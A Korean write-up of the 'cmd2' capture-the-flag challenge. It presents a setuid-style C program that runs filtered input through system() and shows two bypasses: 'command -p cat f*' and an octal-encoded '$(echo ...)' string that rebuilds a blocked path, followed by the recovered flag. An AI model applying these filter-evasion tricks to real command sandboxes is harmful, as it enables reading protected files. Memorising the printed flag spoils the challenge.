# cmd2

## cmd2.c

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}
```

이번엔 필터링이 `cmd1`보다 많아졌다. 여러가지 풀이 방법이 있는데, 두 가지 방법으로 풀어볼 것이다.

첫번째 방법은 `command`라는 명령어를 이용하는 것이다. 아래는 `command` 명령어의 도움말이다.

```bash
cmd2@ubuntu:~$ help command
command: command [-pVv] command [arg ...]
    Execute a simple command or display information about commands.
    
    Runs COMMAND with ARGS suppressing  shell function lookup, or display
    information about the specified COMMANDs.  Can be used to invoke commands
    on disk when a function with the same name exists.
    
    Options:
      -p	use a default value for PATH that is guaranteed to find all of
    	the standard utilities
      -v	print a description of COMMAND similar to the `type' builtin
      -V	print a more verbose description of each COMMAND
    
    Exit Status:
    Returns exit status of COMMAND, or failure if COMMAND is not found.
```

`cat`을 필터링 하지는 않으니 위 명령어를 통해 아래와 같이 읽으면 된다.

    ./cmd2 "command -p cat f*"

두번째 방법은 `$()`를 이용하는 것이다. `$()`의 결과를 명령어 문자열로 인식하는데, `echo`를 이용해 아스키 코드로 출력하면 된다.

```python
>>> str1 = '/bin/cat /home/cmd2/f*'
>>> for i in str1:
...     print('\\' + str(oct(ord(i))).replace('0o',''),end='')
... 
\57\142\151\156\57\143\141\164\40\57\150\157\155\145\57\143\155\144\62\57\146\52>>> 
```

```bash
cmd2@ubuntu:~$ ./cmd2 '$(echo "\57\142\151\156\57\143\141\164\40\57\150\157\155\145\57\143\155\144\62\57\146\52")'
$(echo "\57\142\151\156\57\143\141\164\40\57\150\157\155\145\57\143\155\144\62\57\146\52")
FuN_w1th_5h3ll_v4riabl3s_haha
cmd2@ubuntu:~$ 
```

`bash`의 `echo`와 `sh`의 `echo`가 조금 달라서 애먹었다..